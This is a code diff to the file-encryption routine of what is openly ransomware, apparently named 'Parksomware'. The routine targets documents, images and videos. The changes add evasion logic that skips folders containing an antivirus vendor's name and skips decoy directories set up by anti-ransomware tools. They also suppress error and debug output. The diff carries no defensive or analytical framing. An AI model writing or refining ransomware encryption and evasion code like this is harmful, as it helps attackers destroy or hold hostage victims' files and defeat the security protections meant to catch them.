@@ -14,7 +14,12 @@ public class Encrypt {
     private static final String[] EXTENSIONS = new String[]{".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv"};
     private static final String[] EXCLUDED_FOLDERS = new String[]{
             "C:\\Windows",
-            System.getenv("APPDATA") + "\\Parksomware"
+            System.getenv("APPDATA") + "\\Parksomware",
+            "C:\\$Recycle.Bin",
+            "C\\$WinREAgent"
+    };
+    private static final String[] EXCLUDED_KEYWORDS = {
+            "Estsoft"
     };
 
     public static void runEncryption() throws Exception {
@@ -32,8 +37,8 @@ public class Encrypt {
             try {
                 encryptFile(file);
                 encryptedFiles.add(file.getAbsolutePath());
-            } catch (FileSystemException e) {
-                System.out.println("FileSystemException = " + e.getFile());
+            } catch (FileSystemException ignored) {
+//                System.out.println("FileSystemException = " + e.getFile());
             }
         }
 
@@ -46,12 +51,24 @@ public class Encrypt {
     }
 
     private static void collectFiles(File directory, List<File> files) {
-        String dirPath = directory.getAbsolutePath().toLowerCase();
+        String dirPath = directory.getAbsolutePath();
 
         for (String excludedFolder : EXCLUDED_FOLDERS) {
-            if (dirPath.startsWith(excludedFolder.toLowerCase())) {
+            if (dirPath.toLowerCase().startsWith(excludedFolder.toLowerCase())) {
                 return;
             }
+        }
+
+        for (String keyword : EXCLUDED_KEYWORDS) {
+            if (dirPath.toLowerCase().contains(keyword.toLowerCase())) {
+                System.out.println("AntiVirusDir : " + dirPath);
+                return;
+            }
+        }
+
+        if (dirPath.matches(".*[^a-zA-Z0-9\\\\\\/: \\-_.()\\[\\]{}~\\uAC00-\\uD7AF].*")) {
+            System.out.println("DecoyDir : " + dirPath);
+            return;
         }
 
         File[] found = directory.listFiles();
@@ -69,7 +86,6 @@ public class Encrypt {
                 }
             }
         }
-        System.out.println("found = " + Arrays.toString(found));
     }
 
     private static void encryptFile(File file) throws Exception {
